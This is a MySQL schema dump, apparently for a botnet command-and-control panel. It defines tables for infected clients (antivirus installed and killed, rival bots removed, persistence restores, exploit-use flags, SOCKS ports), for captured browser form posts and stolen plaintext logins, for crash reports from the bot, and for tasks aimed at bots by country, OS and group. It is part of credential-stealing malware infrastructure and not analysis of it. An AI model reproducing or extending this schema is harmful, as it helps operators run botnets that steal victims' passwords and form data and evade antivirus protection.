--
-- Table structure for table `admins`
--

CREATE TABLE IF NOT EXISTS `admins` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(16) CHARACTER SET ascii NOT NULL,
  `password_hash` varchar(40) CHARACTER SET ascii NOT NULL,
  `priv_mask` int(10) unsigned NOT NULL,
  `options` int(10) unsigned NOT NULL,
  `lastlogin` int(10) unsigned NOT NULL COMMENT 'UNIX time',
  `sort_type` varchar(16) NOT NULL,
  `sort_order` varchar(8) NOT NULL,
  `sort_max_per_page` int(11) NOT NULL,
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Administrative users table' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `blacklist`
--

CREATE TABLE IF NOT EXISTS `blacklist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `host` int(11) NOT NULL COMMENT 'IP',
  `reason_id` smallint(6) NOT NULL,
  `date_added` int(10) unsigned NOT NULL COMMENT 'UNIX time',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Blacklisted IPs' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `clients`
--

CREATE TABLE IF NOT EXISTS `clients` (
  `id` bigint(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `GUID` binary(16) NOT NULL COMMENT 'Machine ID',
  `Version` int(11) NOT NULL COMMENT 'Bot client version',
  `CompNameUsername` binary(128) NOT NULL COMMENT 'Computer/User name',
  `CpuName` binary(128) NOT NULL COMMENT 'CPU Description',
  `VideoCardName` binary(128) NOT NULL COMMENT 'VCard Description',
  `InstallPath` binary(255) NOT NULL COMMENT 'Install Path',
  `HostProcessName` varchar(24) NOT NULL COMMENT 'Current host process name',
  `ProductId` varchar(28) CHARACTER SET ascii NOT NULL COMMENT 'Product Id',
  `InfoProcessList` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Process list',
  `InfoSoftwareList` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Installed software list',
  `InfoAutostartList` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Common autostart entries list',
  `InfoGenericList` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Generic information',
  `InfoDebugList` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Debug information',
  `FirstCheckIn` int(10) unsigned NOT NULL COMMENT 'First request sent (Similar to InstallDate)',
  `LastCheckIn` int(10) unsigned NOT NULL COMMENT 'Last Bot CheckIn time',
  `LastInfoReport` int(10) unsigned NOT NULL COMMENT 'Last formgrab/logins logs sent',
  `DnsModify_Revision` bigint(20) unsigned NOT NULL COMMENT 'Dns Modification script version',
  `UrlTrack_Revision` bigint(20) unsigned NOT NULL COMMENT 'Formgrab Url Tracklist version',
  `Config_Revision` bigint(20) unsigned NOT NULL COMMENT 'Dynamic Config version',
  `FileSearch_Revision` int(10) unsigned NOT NULL COMMENT 'File search version',
  `Plugins_Revision` int(10) unsigned NOT NULL COMMENT 'Plugin configuration version',
  `Web_Revision` int(10) unsigned NOT NULL COMMENT 'Debug',
  `OS` int(10) unsigned NOT NULL COMMENT 'Operating System',
  `Locale` char(2) NOT NULL COMMENT '2-Digit country code of bot',
  `LocaleName` varchar(128) CHARACTER SET ascii NOT NULL COMMENT 'Full country name',
  `BotTime` bigint(20) unsigned NOT NULL COMMENT 'Bot local time',
  `LastIP` int(10) unsigned NOT NULL COMMENT 'Last IP of bot',
  `DefaultBrowser` varbinary(32) NOT NULL COMMENT 'Default browser',
  `SocksPort` smallint(5) unsigned NOT NULL COMMENT 'Socks4 Port',
  `BotsKilled` smallint(5) unsigned NOT NULL COMMENT 'Number of bots removed since installation',
  `FileRestoreCount` int(10) unsigned NOT NULL COMMENT 'Number of times persistence had to restore bot file',
  `CrashRestartCount` int(10) unsigned NOT NULL COMMENT 'Crash restart count',
  `RecordAttributes` int(10) unsigned NOT NULL COMMENT 'Various panel record attributes',
  `ClientAttributes` int(10) unsigned NOT NULL COMMENT 'Bot attributes',
  `CustomAttributes` int(10) unsigned NOT NULL COMMENT 'Custom attributes',
  `ClientStatus` int(10) unsigned NOT NULL COMMENT 'Status of client',
  `AvsInstalled` int(10) unsigned NOT NULL COMMENT 'Installed AV products',
  `AvsKilled` int(10) unsigned NOT NULL COMMENT 'AVs determined to be disabled',
  `SecurityToolsInstalled` int(10) unsigned NOT NULL COMMENT 'Non-AV misc security tools mask',
  `SoftwareInstalled` int(10) unsigned NOT NULL COMMENT 'Various installed software',
  `excp_access_violation` int(10) unsigned NOT NULL COMMENT 'Total # of EXCEPTION_ACCESS_VIOLATION in main process since installation',
  `excp_priv_instruction` int(10) unsigned NOT NULL COMMENT 'Total # of EXCEPTION_PRIV_INSTRUCTION in main process since installation',
  `excp_illegal_instruction` int(10) unsigned NOT NULL COMMENT 'Total # of EXCEPTION_ILLEGAL_INSTRUCTION in main process since installation',
  `excp_stack_overflow` int(10) unsigned NOT NULL COMMENT 'Total # of EXCEPTION_STACK_OVERFLOW in main process since installation',
  `excp_in_page_error` int(10) unsigned NOT NULL COMMENT 'Total # of EXCEPTION_IN_PAGE_ERROR in main process since installation',
  `WebAttributes` int(10) unsigned NOT NULL COMMENT 'Web-related attributes',
  `DebugAttributes` int(10) unsigned NOT NULL COMMENT 'Debug related attributes',
  `CveAttributes` int(10) unsigned NOT NULL COMMENT 'Flags related to use of exploits',
  `PrimaryResolution` int(10) unsigned NOT NULL COMMENT 'Primary monitor resolution',
  `LastTask` bigint(20) unsigned NOT NULL COMMENT 'Last command sent ID',
  `GroupName` varchar(12) NOT NULL COMMENT 'Group name',
  `Comments` varchar(64) NOT NULL COMMENT 'Any comment on record',
  `last_tasks_hash` varchar(64) NOT NULL COMMENT 'Last tasks unique hash',
  PRIMARY KEY (`id`),
  KEY `GUID` (`GUID`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `debug_crash_reports`
--

CREATE TABLE IF NOT EXISTS `debug_crash_reports` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `bot_guid` binary(16) NOT NULL COMMENT 'Machine ID',
  `bot_group` varchar(12) CHARACTER SET ascii NOT NULL,
  `bot_ip` int(10) unsigned NOT NULL,
  `bot_os` int(10) unsigned NOT NULL COMMENT 'Operating system information',
  `report_flags` int(10) unsigned NOT NULL,
  `system_time` int(10) unsigned NOT NULL COMMENT 'System time when crash occured',
  `date_received` int(10) unsigned NOT NULL COMMENT 'Time when the server received the report',
  `ntdll_base` int(10) unsigned NOT NULL,
  `kernel32_base` int(10) unsigned NOT NULL,
  `user32_base` int(10) unsigned NOT NULL,
  `advapi32_base` int(10) unsigned NOT NULL,
  `wininet_base` int(10) unsigned NOT NULL,
  `ws2_32_base` int(10) unsigned NOT NULL,
  `crypt32_base` int(10) unsigned NOT NULL,
  `secur32_base` int(10) unsigned NOT NULL,
  `process_id` int(11) NOT NULL COMMENT 'ID Process that crashed',
  `thread_id` int(11) NOT NULL COMMENT 'Thread ID where exception is handled',
  `thread_last_error` int(11) NOT NULL COMMENT 'Threads GetLastError value',
  `hooks_info` int(10) unsigned NOT NULL COMMENT 'Flags describing what, if any, hooks were set',
  `num_active_c2_requests` int(11) NOT NULL COMMENT 'Number of C2 requests being performed at time of exception',
  `num_active_download_tasks` int(10) unsigned NOT NULL,
  `num_active_botkill_tasks` int(10) unsigned NOT NULL,
  `num_persist_file_restores` int(11) NOT NULL COMMENT 'Number of times persistence component had to restore file data at time of exception',
  `bot_base_address` int(10) unsigned NOT NULL COMMENT 'base address of bot module',
  `bot_image_size` int(11) NOT NULL,
  `ntcalls_base_address` int(10) unsigned NOT NULL COMMENT 'internal memory 1',
  `hooks_base_address` int(10) unsigned NOT NULL COMMENT 'internal memory 2',
  `bot_init_status` int(11) NOT NULL,
  `process_name` varchar(42) CHARACTER SET ascii NOT NULL COMMENT 'Filename of process',
  `eip_module_name` varchar(42) CHARACTER SET ascii NOT NULL COMMENT 'Module name of where EIP from exception context record points',
  `exception_module_name` varchar(42) CHARACTER SET ascii NOT NULL COMMENT 'Module name of where exception address',
  `ctx_dr0` int(10) unsigned NOT NULL,
  `ctx_dr1` int(10) unsigned NOT NULL,
  `ctx_dr2` int(10) unsigned NOT NULL,
  `ctx_dr3` int(10) unsigned NOT NULL,
  `ctx_dr6` int(10) unsigned NOT NULL,
  `ctx_dr7` int(10) unsigned NOT NULL,
  `ctx_edi` int(10) unsigned NOT NULL,
  `ctx_esi` int(10) unsigned NOT NULL,
  `ctx_ebx` int(10) unsigned NOT NULL,
  `ctx_edx` int(10) unsigned NOT NULL,
  `ctx_ecx` int(10) unsigned NOT NULL,
  `ctx_eax` int(10) unsigned NOT NULL,
  `ctx_ebp` int(10) unsigned NOT NULL,
  `ctx_eip` int(10) unsigned NOT NULL,
  `ctx_esp` int(10) unsigned NOT NULL,
  `exception_code` bigint(10) unsigned NOT NULL COMMENT 'ExceptionCode member',
  `exception_flags` int(10) unsigned NOT NULL COMMENT 'ExceptionFlags member',
  `exception_address` int(10) unsigned NOT NULL COMMENT 'ExceptionAddress member',
  `exception_num_params` int(10) unsigned NOT NULL COMMENT 'NumberParameters member',
  `exception_param1` int(10) unsigned NOT NULL COMMENT 'ExceptionInformation 0',
  `exception_param2` int(10) unsigned NOT NULL COMMENT 'ExceptionInformation 1',
  `exception_param3` int(10) unsigned NOT NULL COMMENT 'ExceptionInformation 2',
  `exception_param4` int(10) unsigned NOT NULL COMMENT 'Extended param 4',
  `exception_param5` int(10) unsigned NOT NULL COMMENT 'Extended param 5',
  `number_of_chained_exceptions` int(11) NOT NULL COMMENT 'Number of additional chained exceptions',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci COMMENT='Crash and serious exception reports' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `debug_info`
--

CREATE TABLE IF NOT EXISTS `debug_info` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `bot_guid` binary(16) NOT NULL COMMENT 'GUID of bot this message came from',
  `bot_group` varchar(12) COLLATE utf8_unicode_ci NOT NULL COMMENT 'bot group',
  `bot_os` int(10) unsigned NOT NULL COMMENT 'Bot operating system',
  `msg_type` int(10) unsigned NOT NULL COMMENT 'Debug message type',
  `msg_data` text COLLATE utf8_unicode_ci NOT NULL COMMENT 'Debug message data',
  `msg_date` int(10) unsigned NOT NULL COMMENT 'Time message was received',
  `msg_saved_date` int(10) unsigned NOT NULL COMMENT 'Date when the bot client actually generated the debug message and saved it',
  `options` int(10) unsigned NOT NULL COMMENT 'various options',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `exlogs`
--

CREATE TABLE IF NOT EXISTS `exlogs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `event_type` int(10) unsigned NOT NULL COMMENT 'Type of event',
  `username` varchar(255) NOT NULL COMMENT 'Username for log',
  `ip_addr` varchar(32) NOT NULL COMMENT 'IP address',
  `exdata` text NOT NULL COMMENT 'Extended information',
  `create_date` int(10) unsigned NOT NULL COMMENT 'Date of event',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Stores extended logs' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `geoip`
--

CREATE TABLE IF NOT EXISTS `geoip` (
  `IP_STR_FROM` varchar(16) NOT NULL COMMENT 'String ip begin',
  `IP_STR_TO` varchar(16) NOT NULL COMMENT 'String ip end',
  `IP_FROM` double NOT NULL COMMENT 'IP Range begin',
  `IP_TO` double NOT NULL COMMENT 'IP Range end',
  `COUNTRY_CODE2` char(2) NOT NULL COMMENT '2-Char country code (ISO-3166)',
  `COUNTRY_NAME` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `geoip_asn`
--

CREATE TABLE IF NOT EXISTS `geoip_asn` (
  `ip_begin` int(10) unsigned NOT NULL,
  `ip_end` int(10) unsigned NOT NULL,
  `asn_name` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci COMMENT='GeoLite ASN';

-- --------------------------------------------------------

--
-- Table structure for table `geoip_city`
--

CREATE TABLE IF NOT EXISTS `geoip_city` (
  `locID` int(10) unsigned NOT NULL,
  `country` char(8) COLLATE utf8_unicode_ci DEFAULT NULL,
  `region` char(8) COLLATE utf8_unicode_ci DEFAULT NULL,
  `city` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `postalCode` char(32) CHARACTER SET latin1 DEFAULT NULL,
  `latitude` double DEFAULT NULL,
  `longitude` double DEFAULT NULL,
  `dmaCode` char(8) CHARACTER SET latin1 DEFAULT NULL,
  `areaCode` char(8) CHARACTER SET latin1 DEFAULT NULL,
  PRIMARY KEY (`locID`),
  KEY `Index_Country` (`country`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci ROW_FORMAT=FIXED;

-- --------------------------------------------------------

--
-- Table structure for table `geoip_city_ips`
--

CREATE TABLE IF NOT EXISTS `geoip_city_ips` (
  `startIPNum` int(10) unsigned NOT NULL,
  `endIPNum` int(10) unsigned NOT NULL,
  `locID` int(10) unsigned NOT NULL,
  PRIMARY KEY (`startIPNum`,`endIPNum`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 PACK_KEYS=1 DELAY_KEY_WRITE=1;

-- --------------------------------------------------------

--
-- Table structure for table `grabbed_forms`
--

CREATE TABLE IF NOT EXISTS `grabbed_forms` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `bot_guid` binary(16) NOT NULL COMMENT 'Machine GUID of source bot',
  `bot_id` bigint(20) unsigned NOT NULL COMMENT 'Record ID of source bot',
  `host` text CHARACTER SET ascii COLLATE ascii_bin NOT NULL COMMENT 'Host form captured from',
  `post_data` text NOT NULL COMMENT 'Content of post data',
  `post_headers` text CHARACTER SET ascii COLLATE ascii_bin NOT NULL COMMENT 'Select headers from post data',
  `host_process_path` varbinary(255) NOT NULL COMMENT 'Process data captured from on local computer',
  `capture_date` int(10) unsigned NOT NULL COMMENT 'Date/time post data was captured',
  `bot_OS` int(11) unsigned NOT NULL,
  `bot_LocalTime` int(11) NOT NULL,
  `bot_LastIP` int(11) unsigned NOT NULL,
  `bot_Group` varchar(12) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `id_2` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Browser form data captures' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `grabbed_form_filters`
--

CREATE TABLE IF NOT EXISTS `grabbed_form_filters` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Record ID',
  `options` int(10) unsigned NOT NULL COMMENT 'Misc. filter options',
  `filter_mask` varchar(255) NOT NULL COMMENT 'Wildcard mask for host filter',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `grabbed_logins`
--

CREATE TABLE IF NOT EXISTS `grabbed_logins` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Entry ID',
  `bot_guid` binary(16) NOT NULL COMMENT 'Source bot GUID',
  `bot_id` bigint(20) unsigned NOT NULL COMMENT 'Source bot clients ID',
  `info_hash` char(40) CHARACTER SET ascii NOT NULL COMMENT 'SHA1 hash of host/user/password (lowercase)',
  `login_type` mediumint(8) unsigned NOT NULL COMMENT 'Source of login information',
  `host` varchar(255) NOT NULL COMMENT 'Hostname/IP',
  `port` smallint(5) unsigned NOT NULL COMMENT 'Port',
  `user` varchar(255) NOT NULL COMMENT 'Username',
  `password` varchar(255) NOT NULL COMMENT 'Password',
  `date_added` int(10) unsigned NOT NULL COMMENT 'Date added to database',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Grabbed login information' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `login_tries`
--

CREATE TABLE IF NOT EXISTS `login_tries` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `ip_address` int(10) unsigned NOT NULL COMMENT 'IP address of user',
  `attempt_date` int(10) unsigned NOT NULL COMMENT 'Date of failed login attempt',
  PRIMARY KEY (`id`),
  KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Maintains login access records (Anti-brute force)' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `notices`
--

CREATE TABLE IF NOT EXISTS `notices` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'index',
  `notice_target` varchar(255) NOT NULL COMMENT 'User to display notice to (Unused)',
  `notice_author` varchar(255) NOT NULL COMMENT 'Author of notice',
  `notice_content` text NOT NULL COMMENT 'Notice content',
  `notice_options` int(10) unsigned NOT NULL COMMENT 'Various options',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Custom reminders / alerts table' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `plugins`
--

CREATE TABLE IF NOT EXISTS `plugins` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `plugin_name` varchar(128) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Name of plugin',
  `plugin_url` varchar(256) COLLATE utf8_unicode_ci NOT NULL COMMENT 'URL of plugin file',
  `plugin_desc` varchar(255) COLLATE utf8_unicode_ci NOT NULL COMMENT 'Description of plugin',
  `misc_options` int(10) unsigned NOT NULL COMMENT 'Misc control options',
  `load_status` int(10) unsigned NOT NULL COMMENT 'Load status',
  `target_locale` text COLLATE utf8_unicode_ci NOT NULL COMMENT 'Target countries to load to',
  `target_os` int(10) unsigned NOT NULL COMMENT 'Target operating systems',
  `target_general_options` int(10) unsigned NOT NULL COMMENT 'Other targeting options',
  `creation_date` int(10) unsigned NOT NULL COMMENT 'Date plugin entry was added',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `strid` varchar(6) CHARACTER SET ascii NOT NULL,
  `version` varchar(24) CHARACTER SET ascii NOT NULL COMMENT 'version of bot',
  `name` varchar(32) CHARACTER SET ascii NOT NULL COMMENT 'name of net',
  `language` varchar(16) CHARACTER SET ascii NOT NULL COMMENT 'language for panel shit',
  `securecode` varchar(16) CHARACTER SET ascii NOT NULL COMMENT 'security code for login page',
  `crypt_key` varchar(32) CHARACTER SET ascii NOT NULL COMMENT 'crypt key for comms. encryption',
  `created` int(11) NOT NULL COMMENT 'date created (UNIX)',
  `absent_limit` smallint(6) NOT NULL COMMENT 'Max # of days before being marked dead',
  `knock_interval` mediumint(8) unsigned NOT NULL COMMENT 'Knock interval (in minutes) for bots',
  `general_flags` int(10) unsigned NOT NULL COMMENT 'general panel boolean options/flags',
  `minor_flags` int(10) unsigned NOT NULL COMMENT 'Minor status flags',
  `custom_flags` int(10) unsigned NOT NULL COMMENT 'Custom flags',
  `infoblob_flags` int(10) unsigned NOT NULL COMMENT 'Describes which information blobs the panel wants',
  `security_flags` int(10) unsigned NOT NULL COMMENT 'general panel security boolean options/flags',
  `dnslist_version` bigint(20) unsigned NOT NULL,
  `urltrack_version` bigint(20) unsigned NOT NULL,
  `dynconfig_version` bigint(20) unsigned NOT NULL,
  `filesearch_version` bigint(10) unsigned NOT NULL COMMENT 'File search param config version',
  `plugins_version` bigint(20) unsigned NOT NULL COMMENT 'Plugins configuration version',
  `web_version` bigint(20) unsigned NOT NULL COMMENT 'Reserved for future use',
  `peak_clients` int(10) unsigned NOT NULL,
  `avcheck_api_id` varchar(32) NOT NULL,
  `avcheck_api_token` varchar(256) NOT NULL,
  `avcheck_last_result` mediumtext NOT NULL,
  `avcheck_num_detections` int(11) NOT NULL COMMENT 'Number of detections',
  `avcheck_last_check` int(10) unsigned NOT NULL COMMENT 'Last time file was checked',
  `exconfig_data` mediumtext NOT NULL,
  `log_options` int(10) unsigned NOT NULL COMMENT 'Options for event logging',
  `last_tasks_hash` varchar(64) NOT NULL COMMENT 'Last tasks unique hash',
  `option_flags` int(10) unsigned NOT NULL COMMENT 'General panel options',
  `ignored_locales` text NOT NULL COMMENT 'Countries for gate to ignore'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tasks`
--

CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Task ID',
  `tb_id` int(11) NOT NULL COMMENT 'Bot unique task id',
  `name` varchar(64) NOT NULL COMMENT 'Name of task',
  `user` varchar(255) NOT NULL COMMENT 'User who created the task',
  `cmd_hash` varchar(64) NOT NULL COMMENT 'For security purposes',
  `command` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Command data (Extended+)',
  `extended_command` mediumtext CHARACTER SET ascii NOT NULL COMMENT 'Extended command data',
  `max_bots` int(10) unsigned NOT NULL COMMENT 'Maximum number of bots that can execute this command',
  `bots_executed` int(10) unsigned NOT NULL COMMENT 'Number of bots already executed this command',
  `bots_failed` int(10) unsigned NOT NULL COMMENT 'Bots that reported fail task execution',
  `target_general_flags` int(10) unsigned NOT NULL COMMENT 'General flags',
  `target_flags` int(10) unsigned NOT NULL COMMENT 'Bot attribute flags',
  `target_os` int(10) unsigned NOT NULL COMMENT 'Filtered operating systems',
  `target_software` int(10) unsigned NOT NULL COMMENT 'Targeted software',
  `target_hosts` text NOT NULL COMMENT 'Targeted IPs',
  `target_guids` text NOT NULL COMMENT 'Targeted client GUIDs',
  `target_locales` text NOT NULL COMMENT 'Filter countries',
  `target_groups` text NOT NULL COMMENT 'Groups to target',
  `status` int(10) unsigned NOT NULL COMMENT 'Status of task',
  `task_type` smallint(5) unsigned NOT NULL COMMENT 'Type of command',
  `expiration_date` int(10) unsigned NOT NULL COMMENT 'Expiration date of task',
  `creation_date` int(10) unsigned NOT NULL COMMENT 'Creation date',
  PRIMARY KEY (`id`),
  KEY `index` (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;

-- --------------------------------------------------------

--
-- Table structure for table `tasks_completed`
--

CREATE TABLE IF NOT EXISTS `tasks_completed` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT 'iIdex',
  `client_id` bigint(20) unsigned NOT NULL COMMENT 'ID of client in clients table',
  `completion_date` int(10) unsigned NOT NULL COMMENT 'Date of completion',
  `task_id` bigint(20) NOT NULL COMMENT 'ID of task completed',
  `task_tb_id` int(11) NOT NULL,
  `completion_status` int(10) unsigned NOT NULL COMMENT 'Success or failure',
  `completion_message` mediumtext NOT NULL COMMENT 'Additional results',
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `client_id` (`client_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 COMMENT='Completion records for all tasks performed by bots' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `tor_ips`
--

CREATE TABLE IF NOT EXISTS `tor_ips` (
  `node_ip` int(10) unsigned NOT NULL COMMENT 'TOR IP',
  `num_visits` int(10) unsigned NOT NULL COMMENT 'Number of times panel has blocked a request from this IP'
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='TOR IP list';

